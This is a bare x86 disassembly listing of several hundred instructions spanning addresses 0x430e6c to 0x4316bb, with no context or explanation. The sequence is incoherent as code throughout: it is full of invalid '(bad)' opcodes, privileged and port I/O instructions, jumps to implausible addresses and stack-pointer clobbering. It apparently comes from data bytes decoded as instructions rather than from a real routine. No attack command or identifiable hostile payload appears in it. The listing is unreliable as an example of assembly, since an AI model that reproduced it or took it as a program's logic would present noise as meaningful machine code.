  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
